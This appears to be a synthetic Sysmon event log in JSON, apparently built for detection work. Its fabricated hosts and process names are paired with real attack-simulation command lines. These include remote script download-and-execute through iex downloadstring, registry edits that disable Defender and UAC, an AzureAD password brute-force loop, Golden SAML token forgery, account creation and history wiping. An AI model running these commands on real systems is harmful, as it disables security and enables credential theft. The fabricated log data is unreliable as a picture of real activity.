    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-76.mendoza-mills.biz",
        "User": "williamnelson",
        "ProcessID": 9787,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"Get-ADComputer #{hostname} -Properties *\",",
        "LogonID": 608689,
        "LogonGuid": "69e315a2-acd6-4d04-8ac7-e2c67e03ac32",
        "SourceProcessID": 7450,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\economy..dll",
        "DestinationProcessID": 3357,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\knowledge..exe",
        "UtcTime": "2024-05-17T01:36:51.714287Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-46.jordan.com",
        "User": "dcole",
        "ProcessID": 9031,
        "ProcessName": "nc.exe",
        "CommandLine": "\"IEX (iwr \\\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.003/src/qbot-test.iso\\\" -OutFile \\\"$env:TEMP\\\\qbot-test.iso\\\")\\nMount-DiskImage -ImagePath \\\"$env:TEMP\\\\qbot-test.iso\\\"\\n$mountedpath = (Get-DiskImage -ImagePath \\\"$env:TEMP\\\\qbot-test.iso\\\" | Get-Volume).DriveLetter\\n$finalpath = $mountedpath + \\\":\\\\\\\"\\ncd $finalpath\\n.\\\\calc.exe.lnk\",",
        "LogonID": 520601,
        "LogonGuid": "c7b144d3-de77-4a67-8519-2e8167a9c1dd",
        "SourceProcessID": 6356,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\film..exe",
        "DestinationProcessID": 9298,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\structure..dll",
        "UtcTime": "2024-05-17T01:36:51.714287Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-86.marsh.info",
        "User": "acaldwell",
        "ProcessID": 9069,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\csc.exe /out:\\\"$env:localappdata\\\\Microsoft\\\\WindowsApps\\\\Get-Variable.exe\\\" \\\"PathToAtomicsFolder\\\\T1574.008\\\\bin\\\\calc.cs\\\"\\nPowershell -noprofile\\n\",",
        "LogonID": 135299,
        "LogonGuid": "ebf231a1-ec01-4bda-abd0-d1746fb9f46a",
        "SourceProcessID": 7165,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\because..dll",
        "DestinationProcessID": 9119,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\ever..dll",
        "UtcTime": "2024-05-17T01:36:51.715287Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-35.brown.org",
        "User": "walkerwendy",
        "ProcessID": 4551,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"reg.exe ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System /v EnableLUA /t REG_DWORD /d 0 /f\\n\",",
        "LogonID": 783040,
        "LogonGuid": "d6319223-2f2b-4101-a6f4-a5a7e2d2c294",
        "SourceProcessID": 1147,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\around..dll",
        "DestinationProcessID": 1638,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\real..dll",
        "UtcTime": "2024-05-17T01:36:51.715287Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-19.vazquez.info",
        "User": "maxwellreid",
        "ProcessID": 1157,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"New-NetFirewallRule -DisplayName \\\"New rule\\\" -Direction \\\"#{direction}\\\" -LocalPort \\\"#{local_port}\\\" -Protocol \\\"#{protocol}\\\" -Action \\\"#{action}\\\"\",",
        "LogonID": 268910,
        "LogonGuid": "1500b209-2179-4e72-952b-5eb46ee89c55",
        "SourceProcessID": 3120,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\have..dll",
        "DestinationProcessID": 4601,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\spring..dll",
        "UtcTime": "2024-05-17T01:36:51.715287Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-06.evans-yang.info",
        "User": "lgrant",
        "ProcessID": 3501,
        "ProcessName": "malware.exe",
        "CommandLine": "\"echo \\\"\\\" > #{history_path}\\n\",",
        "LogonID": 441585,
        "LogonGuid": "cb63022f-86f3-42c8-88dc-180ba1b851b7",
        "SourceProcessID": 7066,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\fear..exe",
        "DestinationProcessID": 1112,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\arrive..dll",
        "UtcTime": "2024-05-17T01:36:51.715287Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-77.brown.com",
        "User": "ngonzalez",
        "ProcessID": 2704,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"wmic useraccount get /ALL /format:csv\\n\",",
        "LogonID": 592028,
        "LogonGuid": "24bb8451-cfd2-430c-9795-456f56696a82",
        "SourceProcessID": 6641,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\late..exe",
        "DestinationProcessID": 9858,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\garden..exe",
        "UtcTime": "2024-05-17T01:36:51.715287Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-93.white.com",
        "User": "turnercindy",
        "ProcessID": 5200,
        "ProcessName": "malware.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nMS17-10 -noninteractive -consoleoutput\",",
        "LogonID": 347639,
        "LogonGuid": "1ba2dc4d-a87e-4f3e-ac0b-0f77b51aada1",
        "SourceProcessID": 9682,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\drop..exe",
        "DestinationProcessID": 1435,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\article..dll",
        "UtcTime": "2024-05-17T01:36:51.716287Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-21.ellis.com",
        "User": "davidburke",
        "ProcessID": 3100,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"net user $ ATOMIC123! /add /active:yes\",",
        "LogonID": 493136,
        "LogonGuid": "383384b1-f96e-449d-bc9d-a14f3e04a3a3",
        "SourceProcessID": 7904,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\effort..exe",
        "DestinationProcessID": 5367,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\something..exe",
        "UtcTime": "2024-05-17T01:36:51.716287Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-58.delgado.com",
        "User": "richardsronald",
        "ProcessID": 8651,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"Test-NetConnection -ComputerName #{domain} -port #{port}\\n\",",
        "LogonID": 265937,
        "LogonGuid": "73f50e86-f800-4522-8aaa-cfc37afba993",
        "SourceProcessID": 9175,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\dog..dll",
        "DestinationProcessID": 3140,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\human..exe",
        "UtcTime": "2024-05-17T01:36:51.716287Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-17.olson-freeman.biz",
        "User": "robertjohnson",
        "ProcessID": 4616,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"reg add \\\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f\\n\",",
        "LogonID": 835959,
        "LogonGuid": "4832a22e-7596-4b38-a369-3813df33dbf2",
        "SourceProcessID": 9685,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\trade..dll",
        "DestinationProcessID": 4370,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\wide..exe",
        "UtcTime": "2024-05-17T01:36:51.716287Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-95.torres-huynh.biz",
        "User": "kochheather",
        "ProcessID": 4203,
        "ProcessName": "malware.exe",
        "CommandLine": "\"mkdir .\\\\tmp\\\\victim-files\\ncd .\\\\tmp\\\\victim-files\\necho \\\"This file will be encrypted\\\" > .\\\\encrypted_file.txt\\n\\\"#{rar_exe}\\\" a -hp\\\"blue\\\" hello.rar\\ndir\\n\",",
        "LogonID": 967754,
        "LogonGuid": "e307b7e9-268f-4280-bac6-1fee5294d7fa",
        "SourceProcessID": 8159,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\major..dll",
        "DestinationProcessID": 3523,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\west..exe",
        "UtcTime": "2024-05-17T01:36:51.716287Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-99.vance-ortiz.com",
        "User": "stephanieguzman",
        "ProcessID": 8541,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"Import-Module -Name AzureAD\\n\\n$passwords = \\\"#{passwords}\\\".split(\\\"{`n}\\\")\\nforeach($password in $passwords) {\\n  $PWord = ConvertTo-SecureString -String \\\"$password\\\" -AsPlainText -Force\\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \\\"#{username}\\\", $Pword\\n  try {\\n    Write-Host \\\" [-] Attempting ${password} on account #{username}.\\\"\\n    Connect-AzureAD -Credential $Credential 2>&1> $null\\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\\n    Write-Host \\\" [!] #{username}:${password} are valid credentials!`r`n\\\"\\n    break\\n  } catch {\\n    Write-Host \\\" [-] #{username}:${password} invalid credentials.`r`n\\\"\\n  }\\n}\\nWrite-Host \\\"End of bruteforce\\\"\\n\",",
        "LogonID": 604364,
        "LogonGuid": "84105272-9a92-4b37-a9b1-9e9cd92844ce",
        "SourceProcessID": 8489,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\woman..exe",
        "DestinationProcessID": 7047,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\someone..dll",
        "UtcTime": "2024-05-17T01:36:51.716287Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-19.burton.com",
        "User": "jamesrose",
        "ProcessID": 4833,
        "ProcessName": "nc.exe",
        "CommandLine": "\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\\\\csc.exe /r:System.EnterpriseServices.dll /out:\\\"#{output_file}\\\" /target:library \\\"#{source_file}\\\"\\nC:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\\\\regasm.exe /U #{output_file}\\n\",",
        "LogonID": 137225,
        "LogonGuid": "a1b21f53-8eea-4778-9906-8780db5d510d",
        "SourceProcessID": 7520,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\go..exe",
        "DestinationProcessID": 7903,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\computer..dll",
        "UtcTime": "2024-05-17T01:36:51.716287Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-17.stokes.biz",
        "User": "seanle",
        "ProcessID": 1196,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\" /v \\\"DisableAntiSpyware\\\" /t REG_DWORD /d \\\"1\\\" /f >NUL 2>nul\\nreg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\" /v \\\"DisableAntiVirus\\\" /t REG_DWORD /d \\\"1\\\" /f >NUL 2>nul\\nreg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\\" /v \\\"DisableBehaviorMonitoring\\\" /t REG_DWORD /d \\\"1\\\" /f >NUL 2>nul\\nreg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\\" /v \\\"DisableIntrusionPreventionSystem\\\" /t REG_DWORD /d \\\"1\\\" /f >NUL 2>nul\\nreg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\\" /v \\\"DisableIOAVProtection\\\" /t REG_DWORD /d \\\"1\\\" /f >NUL 2>nul\\nreg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\\" /v \\\"DisableOnAccessProtection\\\" /t REG_DWORD /d \\\"1\\\" /f >NUL 2>nul\\nreg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\\" /v \\\"DisableRealtimeMonitoring\\\" /t REG_DWORD /d \\\"1\\\" /f >NUL 2>nul\\nreg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\\" /v \\\"DisableRoutinelyTakingAction\\\" /t REG_DWORD /d \\\"1\\\" /f >NUL 2>nul\\nreg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\\" /v \\\"DisableScanOnRealtimeEnable\\\" /t REG_DWORD /d \\\"1\\\" /f >NUL 2>nul\\nreg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\\" /v \\\"DisableScriptScanning\\\" /t REG_DWORD /d \\\"1\\\" /f >NUL 2>nul\\nreg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Reporting\\\" /v \\\"DisableEnhancedNotifications\\\" /t REG_DWORD /d \\\"1\\\" /f >NUL 2>nul \\nreg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\SpyNet\\\" /v \\\"DisableBlockAtFirstSeen\\\" /t REG_DWORD /d \\\"1\\\" /f >NUL 2>nul\\nreg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\SpyNet\\\" /v \\\"SpynetReporting\\\" /t REG_DWORD /d \\\"0\\\" /f >NUL 2>nul\\nreg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\MpEngine\\\" /v \\\"MpEnablePus\\\" /t REG_DWORD /d \\\"0\\\" /f >NUL 2>nul\\nreg add \\\"HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender Security Center\\\\App and Browser protection\\\" /v \\\"DisallowExploitProtectionOverride\\\" /t REG_DWORD /d \\\"0\\\" /f >NUL 2>nul\\nreg add \\\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Features\\\" /v \\\"TamperProtection\\\"  /t REG_DWORD /d \\\"0\\\" /f >NUL 2>nul\\nreg add \\\"HKLM\\\\software\\\\microsoft\\\\windows defender\\\\spynet\\\" /v \\\"SubmitSamplesConsent\\\" /t REG_DWORD /d \\\"0\\\" /f >NUL 2>nul\\nreg add \\\"HKLM\\\\Software\\\\Microsoft\\\\Windows Defender\\\" /v \\\"PUAProtection\\\" /t REG_DWORD /d \\\"0\\\" /f >NUL 2>nul\\n\",",
        "LogonID": 104117,
        "LogonGuid": "1e89bfb9-2205-48a7-bcb9-d068b7fd46be",
        "SourceProcessID": 1438,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\arm..dll",
        "DestinationProcessID": 9654,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\role..dll",
        "UtcTime": "2024-05-17T01:36:51.717792Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-86.miller.biz",
        "User": "wilsonantonio",
        "ProcessID": 8441,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"Import-Module -Name AzureAD\\n\\n$passwords = \\\"#{passwords}\\\".split(\\\"{`n}\\\")\\nforeach($password in $passwords) {\\n  $PWord = ConvertTo-SecureString -String \\\"$password\\\" -AsPlainText -Force\\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \\\"#{username}\\\", $Pword\\n  try {\\n    Write-Host \\\" [-] Attempting ${password} on account #{username}.\\\"\\n    Connect-AzureAD -Credential $Credential 2>&1> $null\\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\\n    Write-Host \\\" [!] #{username}:${password} are valid credentials!`r`n\\\"\\n    break\\n  } catch {\\n    Write-Host \\\" [-] #{username}:${password} invalid credentials.`r`n\\\"\\n  }\\n}\\nWrite-Host \\\"End of bruteforce\\\"\\n\",",
        "LogonID": 822852,
        "LogonGuid": "9e4446d4-8a5e-4117-a880-27fc97158a20",
        "SourceProcessID": 8098,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\service..exe",
        "DestinationProcessID": 4999,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\day..exe",
        "UtcTime": "2024-05-17T01:36:51.717792Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-94.blanchard-ramirez.net",
        "User": "gonzalezbill",
        "ProcessID": 7091,
        "ProcessName": "malware.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\npowershellsensitive -consoleoutput -noninteractive\",",
        "LogonID": 294910,
        "LogonGuid": "60a858b6-c469-4f3a-a33e-d10a1dda393b",
        "SourceProcessID": 3376,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\never..exe",
        "DestinationProcessID": 7954,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\these..exe",
        "UtcTime": "2024-05-17T01:36:51.717792Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-39.gomez.org",
        "User": "qpatrick",
        "ProcessID": 6240,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"Import-Module AADInternals -Force\\n$saml = New-AADIntSAMLToken -ImmutableID \\\"#{immutable_id}\\\" -PfxFileName \\\"#{certificate_path}\\\" -Issuer \\\"#{issuer_uri}\\\"\\n$conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache\\nif ($conn) { Write-Host \\\"`nSuccessfully connected as $($conn.User)\\\" } else { Write-Host \\\"`nThe connection failed\\\" }\\nWrite-Host \\\"End of Golden SAML\\\"\\n\",",
        "LogonID": 368037,
        "LogonGuid": "710b1861-993c-4f9e-a815-d3ac34d2b6de",
        "SourceProcessID": 8409,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\deal..exe",
        "DestinationProcessID": 8134,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\they..exe",
        "UtcTime": "2024-05-17T01:36:51.717792Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-46.fleming-smith.info",
        "User": "william60",
        "ProcessID": 8766,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"shutdown -r #{timeout}\\n\",",
        "LogonID": 247135,
        "LogonGuid": "d0173bc9-cb3c-4c41-9400-05705b711845",
        "SourceProcessID": 9363,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\sure..exe",
        "DestinationProcessID": 6817,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\chair..exe",
        "UtcTime": "2024-05-17T01:36:51.718797Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-53.martin.org",
        "User": "erika25",
        "ProcessID": 1260,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"chown -R #{owner}:#{group} #{file_or_folder}\\n\",",
        "LogonID": 107581,
        "LogonGuid": "9567a391-1a42-4363-849b-6daeec932a62",
        "SourceProcessID": 1787,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\often..exe",
        "DestinationProcessID": 8560,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\manage..exe",
        "UtcTime": "2024-05-17T01:36:51.718797Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-23.ingram-pitts.com",
        "User": "jason29",
        "ProcessID": 8434,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"sysmon -u\\n\",",
        "LogonID": 760908,
        "LogonGuid": "a0afa5f0-15ce-4537-9e6c-08f8ec21ddb5",
        "SourceProcessID": 6332,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\Congress..dll",
        "DestinationProcessID": 4668,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\administration..dll",
        "UtcTime": "2024-05-17T01:36:51.718797Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-86.miller.biz",
        "User": "frances98",
        "ProcessID": 4189,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\\\\csc.exe -out:#{output_file_name} \\\"#{input_source_code}\\\"\\n#{output_file_name}\\n\",",
        "LogonID": 949062,
        "LogonGuid": "2cb4ad59-c659-49d6-8507-1c7a6f07eead",
        "SourceProcessID": 2144,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\leader..dll",
        "DestinationProcessID": 6401,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\list..dll",
        "UtcTime": "2024-05-17T01:36:51.718797Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-99.bowers-ortiz.org",
        "User": "cheyenne78",
        "ProcessID": 8153,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"New-ItemProperty -Path \\\"HKLM:\\\\Software\\\\Microsoft\\\\Command Processor\\\" -Name \\\"AutoRun\\\" -Value \\\"#{command}\\\" -PropertyType \\\"String\\\"\",",
        "LogonID": 117992,
        "LogonGuid": "d11fb45d-7c15-4a83-9d50-19cc7c0b2d5f",
        "SourceProcessID": 6624,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\strong..exe",
        "DestinationProcessID": 6503,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\billion..dll",
        "UtcTime": "2024-05-17T01:36:51.718797Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-50.osborne.org",
        "User": "fitzgeraldjoseph",
        "ProcessID": 6039,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"ipconfig /all\\nnetsh interface show interface\\narp -a\\nnbtstat -n\\nnet config\\n\",",
        "LogonID": 367489,
        "LogonGuid": "4e7ee0f0-6242-416f-bab9-c060ae184f48",
        "SourceProcessID": 7091,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\church..exe",
        "DestinationProcessID": 4375,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\attorney..dll",
        "UtcTime": "2024-05-17T01:36:51.718797Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-85.tyler.com",
        "User": "ginawhite",
        "ProcessID": 7465,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"reg.exe import \\\"#{registry_file}\\\"\\n\",",
        "LogonID": 219822,
        "LogonGuid": "cb32cd1c-aa9b-4b64-afd8-66ebfba07f31",
        "SourceProcessID": 7859,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\religious..dll",
        "DestinationProcessID": 7415,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\walk..dll",
        "UtcTime": "2024-05-17T01:36:51.719800Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-80.rose-snyder.com",
        "User": "brian50",
        "ProcessID": 4916,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"$x = Get-Random -Minimum 2 -Maximum 9999\\n$y = Get-Random -Minimum 2 -Maximum 9999\\n$z = Get-Random -Minimum 2 -Maximum 9999\\n$w = Get-Random -Minimum 2 -Maximum 9999\\nWrite-Host HaHa_$x$y$z\\n\\n$fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match \\\"User\\\" -and $_.PrincipalSource -match \\\"Local\\\"} | Select Name\\n\\nforeach($member in $fmm) {\\n    if($member -like \\\"*Administrator*\\\") {\\n        $account = $member.Name.Split(\\\"\\\\\\\")[-1] # strip computername\\\\\\n        $originalDescription = (Get-LocalUser -Name $account).Description\\n        Set-LocalUser -Name $account -Description \\\"atr:$account;$originalDescription\\\".Substring(0,48) # Keep original name in description\\n        Rename-LocalUser -Name $account -NewName \\\"HaHa_$x$y$z\\\" # Required due to length limitation\\n        Write-Host \\\"Successfully Renamed $account Account on \\\" $Env:COMPUTERNAME\\n        }\\n    }\\n\",",
        "LogonID": 603960,
        "LogonGuid": "506e5bea-b700-4b7d-9a2e-a462d6208b30",
        "SourceProcessID": 8679,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\win..exe",
        "DestinationProcessID": 8274,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\develop..dll",
        "UtcTime": "2024-05-17T01:36:51.719800Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-22.murphy.com",
        "User": "pmora",
        "ProcessID": 4307,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"set -x\\nsudo kextload #{module_path}\\nkextstat 2>/dev/null | grep SoftRAID\\nsudo kextunload #{module_path}\\nsudo kmutil load -p #{module_path}\\nkextstat 2>/dev/null | grep SoftRAID\\nsudo kmutil unload -p #{module_path}\\n\",",
        "LogonID": 997782,
        "LogonGuid": "6c08693a-1b38-4f72-84d8-2b946841f51b",
        "SourceProcessID": 5655,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\memory..exe",
        "DestinationProcessID": 7762,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\safe..dll",
        "UtcTime": "2024-05-17T01:36:51.719800Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-48.owens.com",
        "User": "hannah87",
        "ProcessID": 8125,
        "ProcessName": "nc.exe",
        "CommandLine": "\"chmod #{symbolic_mode} #{file_or_folder}\\n\",",
        "LogonID": 299560,
        "LogonGuid": "fa0c02d0-72c6-42ce-b792-602a65930f71",
        "SourceProcessID": 9291,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\their..exe",
        "DestinationProcessID": 7977,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\first..exe",
        "UtcTime": "2024-05-17T01:36:51.719800Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-19.mack.net",
        "User": "millerlarry",
        "ProcessID": 1982,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"halt -p\\n\",",
        "LogonID": 278459,
        "LogonGuid": "5530271b-79b1-477b-aa2a-6142405d32a2",
        "SourceProcessID": 6106,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\within..dll",
        "DestinationProcessID": 3168,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\five..dll",
        "UtcTime": "2024-05-17T01:36:51.720797Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-27.murray-frederick.com",
        "User": "alexmorrison",
        "ProcessID": 9896,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"cat /etc/pam.d/system-auth\\ncat /etc/security/pwquality.conf\\n\",",
        "LogonID": 813243,
        "LogonGuid": "5f28ec14-335d-43f5-96f7-680d16a230d6",
        "SourceProcessID": 7995,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\compare..exe",
        "DestinationProcessID": 9638,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\whom..exe",
        "UtcTime": "2024-05-17T01:36:51.720797Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-77.williams.com",
        "User": "newmanhenry",
        "ProcessID": 9333,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"\\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\AdFind.exe\\\" -f (objectcategory=group) #{optional_args}\\n\",",
        "LogonID": 814718,
        "LogonGuid": "933d2fc3-5338-40a5-8ea5-f841296c931e",
        "SourceProcessID": 2378,
        "SourceProcessName": "regsvr32.exe",
